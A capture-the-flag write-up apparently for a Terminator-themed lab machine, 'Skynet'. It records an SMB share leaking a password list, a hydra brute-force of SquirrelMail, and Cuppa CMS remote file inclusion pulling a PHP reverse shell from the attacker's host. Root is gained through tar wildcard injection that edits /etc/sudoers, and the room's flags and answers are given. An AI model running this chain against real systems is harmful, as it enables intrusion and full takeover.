---
A vulnerable Terminator themed Linux machine.
---

![|333](https://i.imgur.com/SNHDHoh.png)
Hasta la vista, baby.

Are you able to compromise this Terminator themed machine?

![](https://i.imgur.com/EaY7BBz.png)


```
┌──(kali㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.158.135
[sudo] password for kali: 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-09-27 19:23 EDT
Nmap scan report for 10.10.158.135
Host is up (0.20s latency).
Not shown: 994 closed tcp ports (reset)
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 99:23:31:bb:b1:e9:43:b7:56:94:4c:b9:e8:21:46:c5 (RSA)
|   256 57:c0:75:02:71:2d:19:31:83:db:e4:fe:67:96:68:cf (ECDSA)
|_  256 46:fa:4e:fc:10:a5:4f:57:57:d0:6d:54:f6:c3:4d:fe (ED25519)
80/tcp  open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Skynet
110/tcp open  pop3        Dovecot pop3d
|_pop3-capabilities: AUTH-RESP-CODE RESP-CODES PIPELINING TOP CAPA UIDL SASL
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
143/tcp open  imap        Dovecot imapd
|_imap-capabilities: LOGIN-REFERRALS capabilities ID post-login ENABLE LITERAL+ more LOGINDISABLEDA0001 listed IMAP4rev1 OK SASL-IR have Pre-login IDLE
445/tcp open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.92%E=4%D=9/27%OT=22%CT=1%CU=37367%PV=Y%DS=2%DC=T%G=Y%TM=6333860
OS:E%P=x86_64-pc-linux-gnu)SEQ(SP=FA%GCD=1%ISR=111%TI=Z%CI=I%II=I%TS=8)OPS(
OS:O1=M505ST11NW7%O2=M505ST11NW7%O3=M505NNT11NW7%O4=M505ST11NW7%O5=M505ST11
OS:NW7%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(
OS:R=Y%DF=Y%T=40%W=6903%O=M505NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: Host: SKYNET; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 1h40m00s, deviation: 2h53m12s, median: 0s
|_nbstat: NetBIOS name: SKYNET, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2022-09-27T23:23:50
|_  start_date: N/A
| smb-os-discovery: 
|   OS: Windows 6.1 (Samba 4.3.11-Ubuntu)
|   Computer name: skynet
|   NetBIOS computer name: SKYNET\x00
|   Domain name: \x00
|   FQDN: skynet
|_  System time: 2022-09-27T18:23:49-05:00

TRACEROUTE (using port 111/tcp)
HOP RTT       ADDRESS
1   199.39 ms 10.11.0.1
2   199.67 ms 10.10.158.135

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 42.43 seconds
zsh: segmentation fault  sudo nmap -sC -sV -T4 -A -Pn -sS -n -O 10.10.158.135


┌──(kali㉿kali)-[~]
└─$ feroxbuster --url http://10.10.158.135 -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.158.135
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       18l       43w      523c http://10.10.158.135/
301      GET        9l       28w      314c http://10.10.158.135/admin => http://10.10.158.135/admin/
301      GET        9l       28w      315c http://10.10.158.135/config => http://10.10.158.135/config/
301      GET        9l       28w      312c http://10.10.158.135/css => http://10.10.158.135/css/
200      GET       18l       43w      523c http://10.10.158.135/index.html
301      GET        9l       28w      311c http://10.10.158.135/js => http://10.10.158.135/js/
301      GET        9l       28w      321c http://10.10.158.135/squirrelmail => http://10.10.158.135/squirrelmail/
301      GET        9l       28w      328c http://10.10.158.135/squirrelmail/config => http://10.10.158.135/squirrelmail/config/
301      GET        9l       28w      328c http://10.10.158.135/squirrelmail/images => http://10.10.158.135/squirrelmail/images/
302      GET        0l        0w        0c http://10.10.158.135/squirrelmail/index.php => src/login.php
301      GET        9l       28w      329c http://10.10.158.135/squirrelmail/plugins => http://10.10.158.135/squirrelmail/plugins/
301      GET        9l       28w      325c http://10.10.158.135/squirrelmail/src => http://10.10.158.135/squirrelmail/src/
301      GET        9l       28w      328c http://10.10.158.135/squirrelmail/themes => http://10.10.158.135/squirrelmail/themes/
301      GET        9l       28w      343c http://10.10.158.135/squirrelmail/plugins/administrator => http://10.10.158.135/squirrelmail/plugins/administrator/


found
http://10.10.158.135/squirrelmail/src/login.php

enumerate samba


┌──(kali㉿kali)-[~/skynet]
└─$ smbclient -L 10.10.158.135                          
Password for [WORKGROUP\kali]:

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        anonymous       Disk      Skynet Anonymous Share
        milesdyson      Disk      Miles Dyson Personal Share
        IPC$            IPC       IPC Service (skynet server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            SKYNET

connect to anonymous share

──(kali㉿kali)-[~/skynet]
└─$ smbclient //10.10.158.135/anonymous
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Thu Nov 26 11:04:00 2020
  ..                                  D        0  Tue Sep 17 03:20:17 2019
  attention.txt                       N      163  Tue Sep 17 23:04:59 2019
  logs                                D        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5821640 blocks available

mb: \> get attention.txt
getting file \attention.txt of size 163 as attention.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
smb: \> cd logs
smb: \logs\> ls
  .                                   D        0  Wed Sep 18 00:42:16 2019
  ..                                  D        0  Thu Nov 26 11:04:00 2020
  log2.txt                            N        0  Wed Sep 18 00:42:13 2019
  log1.txt                            N      471  Wed Sep 18 00:41:59 2019
  log3.txt                            N        0  Wed Sep 18 00:42:16 2019

                9204224 blocks of size 1024. 5821640 blocks available
smb: \logs\> get log1.txt
getting file \logs\log1.txt of size 471 as log1.txt (0.5 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \logs\> exit
                                                                                                                 
┌──(kali㉿kali)-[~/skynet]
└─$ ls
attention.txt  log1.txt
                                                                                                                 
┌──(kali㉿kali)-[~/skynet]
└─$ cat attention.txt 
A recent system malfunction has caused various passwords to be changed. All skynet employees are required to change their password after seeing this.
-Miles Dyson
                                                                                                                 

password list

┌──(kali㉿kali)-[~/skynet]
└─$ cat log1.txt     
cyborg007haloterminator
terminator22596
terminator219
terminator20
terminator1989
terminator1988
terminator168
terminator16
terminator143
terminator13
terminator123!@#
terminator1056
terminator101
terminator10
terminator02
terminator00
roboterminator
pongterminator
manasturcaluterminator
exterminator95
exterminator200
dterminator
djxterminator
dexterminator
determinator
cyborg007haloterminator
avsterminator
alonsoterminator
Walterminator
79terminator6
1996terminator

using hydra

┌──(kali㉿kali)-[~/skynet]
└─$ hydra -l milesdyson -P log1.txt 10.10.158.135 http-post-form "/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect."
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-09-27 19:47:58
[DATA] max 16 tasks per 1 server, overall 16 tasks, 31 login tries (l:1/p:31), ~2 tries per task
[DATA] attacking http-post-form://10.10.158.135:80/squirrelmail/src/redirect.php:login_username=^USER^&secretkey=^PASS^&js_autodetect_results=1&just_logged_in=1:Unknown user or password incorrect.
[80][http-post-form] host: 10.10.158.135   login: milesdyson   password: cyborg007haloterminator
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-09-27 19:48:09

login http://10.10.158.135/squirrelmail/src/webmail.php

milesdyson: cyborg007haloterminator

There are 3 emails in the INBOX, and no email in the other directories: 

Subject:   	Samba Password reset
From:   	skynet@skynet
Date:   	Tue, September 17, 2019 10:10 pm
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

We have changed your smb password after system malfunction.
Password: )s{A&2Z=F^n_E.B`


From:   	serenakogan@skynet
Date:   	Tue, September 17, 2019 3:16 am
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

01100010 01100001 01101100 01101100 01110011 00100000 01101000 01100001 01110110
01100101 00100000 01111010 01100101 01110010 01101111 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111 00100000 01101101 01100101 00100000 01110100 01101111
00100000 01101101 01100101 00100000 01110100 01101111 00100000 01101101 01100101
00100000 01110100 01101111


From:   	serenakogan@skynet
Date:   	Tue, September 17, 2019 3:13 am
Priority:   	Normal
Options:   	View Full Header |  View Printable Version  | Download this as a file

i can i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i i can i i i everything else . . . . . . . . . . . . . .
balls have a ball to me to me to me to me to me to me to me
i . . . . . . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to
you i i i i i everything else . . . . . . . . . . . . . .
balls have 0 to me to me to me to me to me to me to me to me to
you i i i everything else . . . . . . . . . . . . . .
balls have zero to me to me to me to me to me to me to me to me to


    The 1st email is a password for Samba.
    The 2nd email is a binary string that means: balls have zero to me to me to me to me to me to me to me to me to (cyberchef/remove whitespace/from binary)
    The 3rd email is kind of a poem containing the key decoded from the 2nd email.

We’ll check later if we need these last 2 emails. For now, let’s connect to miles’ samba share with the password diclosed in the 1st email: 


┌──(kali㉿kali)-[~/skynet]
└─$ smbclient -U milesdyson //10.10.158.135/milesdyson
Password for [WORKGROUP\milesdyson]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Tue Sep 17 05:05:47 2019
  ..                                  D        0  Tue Sep 17 23:51:03 2019
  Improving Deep Neural Networks.pdf      N  5743095  Tue Sep 17 05:05:14 2019
  Natural Language Processing-Building Sequence Models.pdf      N 12927230  Tue Sep 17 05:05:14 2019
  Convolutional Neural Networks-CNN.pdf      N 19655446  Tue Sep 17 05:05:14 2019
  notes                               D        0  Tue Sep 17 05:18:40 2019
  Neural Networks and Deep Learning.pdf      N  4304586  Tue Sep 17 05:05:14 2019
  Structuring your Machine Learning Project.pdf      N  3531427  Tue Sep 17 05:05:14 2019

                9204224 blocks of size 1024. 5821360 blocks available
smb: \> cd notes
smb: \notes\> ls
  .                                   D        0  Tue Sep 17 05:18:40 2019
  ..                                  D        0  Tue Sep 17 05:05:47 2019
  3.01 Search.md                      N    65601  Tue Sep 17 05:01:29 2019
  4.01 Agent-Based Models.md          N     5683  Tue Sep 17 05:01:29 2019
  2.08 In Practice.md                 N     7949  Tue Sep 17 05:01:29 2019
  0.00 Cover.md                       N     3114  Tue Sep 17 05:01:29 2019
  1.02 Linear Algebra.md              N    70314  Tue Sep 17 05:01:29 2019
  important.txt                       N      117  Tue Sep 17 05:18:39 2019
  6.01 pandas.md                      N     9221  Tue Sep 17 05:01:29 2019
  3.00 Artificial Intelligence.md      N       33  Tue Sep 17 05:01:29 2019
  2.01 Overview.md                    N     1165  Tue Sep 17 05:01:29 2019
  3.02 Planning.md                    N    71657  Tue Sep 17 05:01:29 2019
  1.04 Probability.md                 N    62712  Tue Sep 17 05:01:29 2019
  2.06 Natural Language Processing.md      N    82633  Tue Sep 17 05:01:29 2019
  2.00 Machine Learning.md            N       26  Tue Sep 17 05:01:29 2019
  1.03 Calculus.md                    N    40779  Tue Sep 17 05:01:29 2019
  3.03 Reinforcement Learning.md      N    25119  Tue Sep 17 05:01:29 2019
  1.08 Probabilistic Graphical Models.md      N    81655  Tue Sep 17 05:01:29 2019
  1.06 Bayesian Statistics.md         N    39554  Tue Sep 17 05:01:29 2019
  6.00 Appendices.md                  N       20  Tue Sep 17 05:01:29 2019
  1.01 Functions.md                   N     7627  Tue Sep 17 05:01:29 2019
  2.03 Neural Nets.md                 N   144726  Tue Sep 17 05:01:29 2019
  2.04 Model Selection.md             N    33383  Tue Sep 17 05:01:29 2019
  2.02 Supervised Learning.md         N    94287  Tue Sep 17 05:01:29 2019
  4.00 Simulation.md                  N       20  Tue Sep 17 05:01:29 2019
  3.05 In Practice.md                 N     1123  Tue Sep 17 05:01:29 2019
  1.07 Graphs.md                      N     5110  Tue Sep 17 05:01:29 2019
  2.07 Unsupervised Learning.md       N    21579  Tue Sep 17 05:01:29 2019
  2.05 Bayesian Learning.md           N    39443  Tue Sep 17 05:01:29 2019
  5.03 Anonymization.md               N     2516  Tue Sep 17 05:01:29 2019
  5.01 Process.md                     N     5788  Tue Sep 17 05:01:29 2019
  1.09 Optimization.md                N    25823  Tue Sep 17 05:01:29 2019
  1.05 Statistics.md                  N    64291  Tue Sep 17 05:01:29 2019
  5.02 Visualization.md               N      940  Tue Sep 17 05:01:29 2019
  5.00 In Practice.md                 N       21  Tue Sep 17 05:01:29 2019
  4.02 Nonlinear Dynamics.md          N    44601  Tue Sep 17 05:01:29 2019
  1.10 Algorithms.md                  N    28790  Tue Sep 17 05:01:29 2019
  3.04 Filtering.md                   N    13360  Tue Sep 17 05:01:29 2019
  1.00 Foundations.md                 N       22  Tue Sep 17 05:01:29 2019

                9204224 blocks of size 1024. 5821360 blocks available
smb: \notes\> get important.txt 
getting file \notes\important.txt of size 117 as important.txt (0.1 KiloBytes/sec) (average 0.1 KiloBytes/sec)
smb: \notes\> exit
                                                                                                                  
┌──(kali㉿kali)-[~/skynet]
└─$ cat important.txt 

1. Add features to beta CMS /45kra24zxs28v3yd
2. Work on T-800 Model 101 blueprints
3. Spend more time with my wife


┌──(kali㉿kali)-[~/skynet]
└─$ curl -s http://10.10.158.135/45kra24zxs28v3yd
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>301 Moved Permanently</title>
</head><body>
<h1>Moved Permanently</h1>
<p>The document has moved <a href="http://10.10.158.135/45kra24zxs28v3yd/">here</a>.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.158.135 Port 80</address>
</body></html>
                                                                                                                  
┌──(kali㉿kali)-[~/skynet]
└─$ curl -s http://10.10.158.135/45kra24zxs28v3yd/
<html>
<head>
<style>
body {
  color: white;
}
</style>
</head>
<body bgcolor="black">
<center><br />
<img src='miles.jpg'>
<h2>Miles Dyson Personal Page</h2><p>Dr. Miles Bennett Dyson was the original inventor of the neural-net processor which would lead to the development of Skynet,<br /> a computer A.I. intended to control electronically linked weapons and defend the United States.</p>
</center>
</body>
</html>

El Doctor Miles Bennett Dyson es un personaje de Terminator. Fue el inventor original de un procesador neural que daría lugar a la elaboración de Skynet, una computadora con inteligencia artificia


┌──(kali㉿kali)-[~/skynet]
└─$ feroxbuster --url http://10.10.158.135/45kra24zxs28v3yd/ -w /usr/share/wordlists/dirb/common.txt -t 60 -C 404,403

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.7.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.158.135/45kra24zxs28v3yd/
 🚀  Threads               │ 60
 📖  Wordlist              │ /usr/share/wordlists/dirb/common.txt
 💢  Status Code Filters   │ [404, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.7.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET       15l       57w      418c http://10.10.158.135/45kra24zxs28v3yd/
301      GET        9l       28w      339c http://10.10.158.135/45kra24zxs28v3yd/administrator => http://10.10.158.135/45kra24zxs28v3yd/administrator/
301      GET        9l       28w      346c http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts => http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts/
301      GET        9l       28w      347c http://10.10.158.135/45kra24zxs28v3yd/administrator/classes => http://10.10.158.135/45kra24zxs28v3yd/administrator/classes/
301      GET        9l       28w      350c http://10.10.158.135/45kra24zxs28v3yd/administrator/components => http://10.10.158.135/45kra24zxs28v3yd/administrator/components/

http://10.10.158.135/45kra24zxs28v3yd/administrator/


Searching for RFI vulnerabilities affecting Cuppa CMS leads to https://www.exploit-db.com/exploits/25971. 
Cuppa CMS - '/alertConfigField.php' Local/Remote File Inclusion 

http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=../../../../../../../../../etc/passwd

        root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
messagebus:x:107:111::/var/run/dbus:/bin/false
uuidd:x:108:112::/run/uuidd:/bin/false
dnsmasq:x:109:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:110:65534::/var/run/sshd:/usr/sbin/nologin
milesdyson:x:1001:1001:,,,:/home/milesdyson:/bin/bash
dovecot:x:111:119:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:112:120:Dovecot login user,,,:/nonexistent:/bin/false
postfix:x:113:121::/var/spool/postfix:/bin/false
mysql:x:114:123:MySQL Server,,,:/nonexistent:/bin/false

:)

revshell

┌──(kali㉿kali)-[~/skynet]
└─$ wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
--2022-09-27 20:01:47--  https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.108.133, 185.199.111.133, 185.199.109.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.108.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5491 (5.4K) [text/plain]
Saving to: ‘php-reverse-shell.php’

php-reverse-shell.php        100%[============================================>]   5.36K  --.-KB/s    in 0s      

2022-09-27 20:01:47 (23.6 MB/s) - ‘php-reverse-shell.php’ saved [5491/5491]

replace ip and maybe port
                                                                                                                  
┌──(kali㉿kali)-[~/skynet]
└─$ nano php-reverse-shell.php 
                                                                                                                  
┌──(kali㉿kali)-[~/skynet]
└─$ python3 -m http.server                        
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.10.158.135 - - [27/Sep/2022 20:03:36] "GET /php-reverse-shell.php HTTP/1.0" 200 -


go to

http://10.10.158.135/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://10.11.81.220:8000/php-reverse-shell.php

┌──(kali㉿kali)-[~/skynet]
└─$ rlwrap nc -nlvp 1234 
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::1234
Ncat: Listening on 0.0.0.0:1234
Ncat: Connection from 10.10.158.135.
Ncat: Connection from 10.10.158.135:54716.
Linux skynet 4.8.0-58-generic #63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 19:03:37 up 44 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off

$ python3 -c "import pty;pty.spawn('/bin/bash')"
www-data@skynet:/$ cd /home
cd /home
www-data@skynet:/home$ ls
ls
milesdyson
www-data@skynet:/home$ cd milesdyson
cd milesdyson
www-data@skynet:/home/milesdyson$ ls
ls
backups  mail  share  user.txt
www-data@skynet:/home/milesdyson$ cat user.txt
cat user.txt
7ce5c2109a40f958099283600a9ae807


priv esc

www-data@skynet:/home/milesdyson$ ls -l
ls -l
total 16
drwxr-xr-x 2 root       root       4096 Sep 17  2019 backups
drwx------ 3 milesdyson milesdyson 4096 Sep 17  2019 mail
drwxr-xr-x 3 milesdyson milesdyson 4096 Sep 17  2019 share
-rw-r--r-- 1 milesdyson milesdyson   33 Sep 17  2019 user.txt
www-data@skynet:/home/milesdyson$ cd backups
cd backups
www-data@skynet:/home/milesdyson/backups$ ls -la
ls -la
total 4584
drwxr-xr-x 2 root       root          4096 Sep 17  2019 .
drwxr-xr-x 5 milesdyson milesdyson    4096 Sep 17  2019 ..
-rwxr-xr-x 1 root       root            74 Sep 17  2019 backup.sh
-rw-r--r-- 1 root       root       4679680 Sep 27 19:06 backup.tgz
www-data@skynet:/home/milesdyson/backups$ cat backup.sh
cat backup.sh
#!/bin/bash
cd /var/www/html
tar cf /home/milesdyson/backups/backup.tgz *

There is a backup script (backup.sh) that compresses the entire /var/www/html directory with tar and saves the archive to miles’ home directory. The script is executed by root every minute: 

www-data@skynet:/home/milesdyson/backups$ cat /etc/crontab
cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

You can find ways to elevate the privileges using GTFOBins (https://gtfobins.github.io/gtfobins/tar/). We can execute a privileged shell with tar executed by root as follows: 


tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

www-data@skynet:/var/www/html$ echo 'echo "www-data ALL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh
<LL=(root) NOPASSWD: ALL" >> /etc/sudoers' > sudo.sh                         
www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"
<ml$ touch "/var/www/html/--checkpoint-action=exec=sh sudo.sh"               
www-data@skynet:/var/www/html$ touch "/var/www/html/--checkpoint=1"
touch "/var/www/html/--checkpoint=1"
www-data@skynet:/var/www/html$ ls
ls
--checkpoint-action=exec=sh sudo.sh  admin   image.png   style.css
--checkpoint=1                       ai      index.html  sudo.sh
--checkpoint=exec=bash shell         config  js
45kra24zxs28v3yd                     css     shell

Now, after a minute, the cronjob should have been executed, and we can get our root access by just using sudo su:

www-data@skynet:/var/www/html$ ls
ls
--checkpoint-action=exec=sh sudo.sh  admin   css         js
--checkpoint=1                       ai      image.png   style.css
45kra24zxs28v3yd                     config  index.html  sudo.sh
www-data@skynet:/var/www/html$ sudo su
sudo su
root@skynet:/var/www/html# cat /root/root.txt
cat /root/root.txt
3f0372db24753accc7179a282cd6a949



```

![[Pasted image 20220927184258.png]]

What is Miles password for his emails?
Enumerate Samba
*cyborg007haloterminator*

What is the hidden directory?
*/45kra24zxs28v3yd/*

What is the vulnerability called when you can include a remote file for malicious purposes?
*remote file inclusion*

What is the user flag?
*7ce5c2109a40f958099283600a9ae807*

What is the root flag?
A recursive call.
*3f0372db24753accc7179a282cd6a949*

[[Game Zone]]